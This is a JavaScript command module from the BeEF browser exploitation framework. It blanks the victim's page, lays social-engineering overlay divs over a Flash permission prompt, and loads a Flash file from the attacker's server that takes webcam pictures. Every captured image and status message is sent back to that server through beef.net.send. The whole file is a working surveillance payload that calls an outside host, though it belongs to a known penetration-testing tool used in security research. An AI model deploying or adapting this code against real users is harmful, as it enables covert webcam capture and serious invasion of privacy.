//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//



beef.execute(function() {
    
    /*
    If you ever experience that the "Allow button" of the flash warning is not clickable, it can have several reasons:
    - Some CSS/Flash bug: http://stackoverflow.com/questions/3003724/cant-click-allow-button-in-flash-on-firefox
    - There is a bug in flash: http://forums.adobe.com/thread/880967
    - You overlayed (a single pixel is enough) the warning message with something (e.g. a div). Try to not include the
      body_social_engineer_and_overlay below and try again.
    */
    
    
    //The social engineering message and the overlay div's
    var body_social_engineer_and_overlay = '<div class="thingy" style="position:absolute;top:0px;left:0px;width:800px;height:109px"></div> <div class="thingy" style="position:absolute;top:105px;left:0px;width:100px;height:315px"></div> <div class="thingy" style="position:absolute;top:105px;left:315px;width:570px;height:315px"></div> <div class="thingy" style="position:absolute;top:248px;left:0px;width:400px;height:280px"></div><div class="text" style="position:absolute;top:20px;left:50px;z-index:100"> <h2 style="margin:0"><%= @social_engineering_title %></h2> <p style="width: 500px; font-size: 14px; margin:0"><%= @social_engineering_text %></p></div>';
    
    
    //These 4 function names [noCamera(), noCamera(), pressedDisallow(), pictureCallback(picture), allPicturesTaken()] are hard coded in the swf actionscript3. Flash will invoke these functions directly. The picture for the pictureCallback function will be a base64 encoded JPG string
    var js_functions = '<script>function noCamera() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=The user has no camera"); }; function pressedAllow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed allow, you should get pictures soon"); }; function pressedDisallow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed disallow, you won\'t get pictures"); }; function pictureCallback(picture) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "image="+picture); }; function allPicturesTaken(){  }';
    
    //This function is called by swfobject, if if fails to add the flash file to the page
    
    js_functions += 'function swfobjectCallback(e) { if(e.success){beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Swfobject successfully added flash object to the victim page");}else{beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Swfobject was not able to add the swf file to the page. This could mean there was no flash plugin installed.");} };</script>';
    
    
    //Either do the overlay (body_social_engineer_and_overlay) or do something like in the next line (showing a message if adobe flash is not installed)
    //We'll notice when flash is not installed anyway...
    //var body_flash_container = '<div id="main" style="position:absolute;top:150px;left:80px;width:300px;height:300px;opacity:0.8;"><div><h1>You need FlashPlayer 9 or higher!</h1><p><a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" /></a></p></div></div>';
    var body_flash_container = '<div id="main" style="position:absolute;top:150px;left:80px;width:300px;height:300px;opacity:0.8;"></div>';
    
    
    //The style is the only thing we already append to the head
	var theHead = document.getElementsByTagName("head")[0];         
	var style = document.createElement('style');
    style.type = 'text/css';
    style.innerHTML = 'body { background: #eee; } .thingy { z-index:50; background-color:#eee; border:1px solid #eee; }';
    theHead.appendChild(style);
    
    //A nice library that helps us to include the swf file
    var swfobject_script = '<script type="text/javascript" src="http://'+beef.net.host+':'+beef.net.port+'/swfobject.js"></script>'
    
    //This is the javascript that actually calls the swfobject library to include the swf file 
    var include_script = '<script>var flashvars = {\'no_of_pictures\':\'<%= @no_of_pictures %>\', \'interval\':\'<%= @interval %>\'}; var parameters = {}; parameters.scale = "noscale"; parameters.wmode = "opaque"; parameters.allowFullScreen = "true"; parameters.allowScriptAccess = "always"; var attributes = {}; swfobject.embedSWF("http://'+beef.net.host+':'+beef.net.port+'/takeit.swf", "main", "403", "345", "9", "expressInstall.swf", flashvars, parameters, attributes, swfobjectCallback);</script>';
    
    //Empty body first
    $j('body').html('');
    //Now show our flash stuff, muahahaha
    $j('body').append(js_functions, swfobject_script, body_flash_container, body_social_engineer_and_overlay, include_script);
    
});





